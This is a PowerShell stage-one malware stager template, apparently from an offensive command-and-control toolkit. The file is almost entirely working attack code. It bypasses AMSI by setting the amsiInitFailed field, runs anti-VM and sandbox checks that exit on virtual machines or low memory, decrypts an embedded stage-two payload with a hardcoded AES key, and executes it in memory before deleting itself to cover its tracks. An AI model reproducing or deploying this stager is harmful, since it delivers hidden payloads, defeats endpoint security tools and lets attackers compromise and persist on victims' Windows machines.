# stagers/powershell/template.ps1

# ===================
# ⚠️ STAGE 1 PAYLOAD
# AES-256-CBC Decryption + Anti-VM + AMSI Bypass
# ===================

# --- AMSI Bypass (runtime, no IEX)
$Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Fld = $Ref.GetField('amsiInitFailed','NonPublic,Static')
$Fld.SetValue($null,$true)

# --- Anti-VM checks
try {
    $man = (Get-WmiObject Win32_ComputerSystem).Manufacturer
    $ram = (Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize
    if ($man -match "VMware|VirtualBox|KVM|Xen") { exit }
    if ($ram -lt 4000000) { exit }  # <4GB
} catch {}

# --- AES Decryption of Stage 2 (REPLACE_AES)
$enc = "REPLACE_AES"
$parts = $enc -split ':'
$ivHex = $parts[0]
$iv = for ($i = 0; $i -lt $ivHex.Length; $i += 2) { [Convert]::ToByte($ivHex.Substring($i,2),16) }
$cipherBytes = [Convert]::FromBase64String($parts[1])

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.KeySize = 256
$AES.BlockSize = 128

# 🔐 AES Key must match .env ENCRYPTION_KEY
$key = [Text.Encoding]::UTF8.GetBytes("Zxcvbnm1234567890Zxcvbnm12345678")
$AES.Key = $key
$AES.IV = $iv
$Decryptor = $AES.CreateDecryptor()
$ms = New-Object IO.MemoryStream(,$cipherBytes)
$cs = New-Object Security.Cryptography.CryptoStream($ms, $Decryptor, 'Read')
$sr = New-Object IO.StreamReader($cs)
$stage2 = $sr.ReadToEnd()

# --- Run Stage 2 in memory
$ScriptBlock = [ScriptBlock]::Create($stage2)
Invoke-Command -ScriptBlock $ScriptBlock

# --- Optional self-delete
try {
    $me = $MyInvocation.MyCommand.Path
    Remove-Item $me -Force
} catch {}
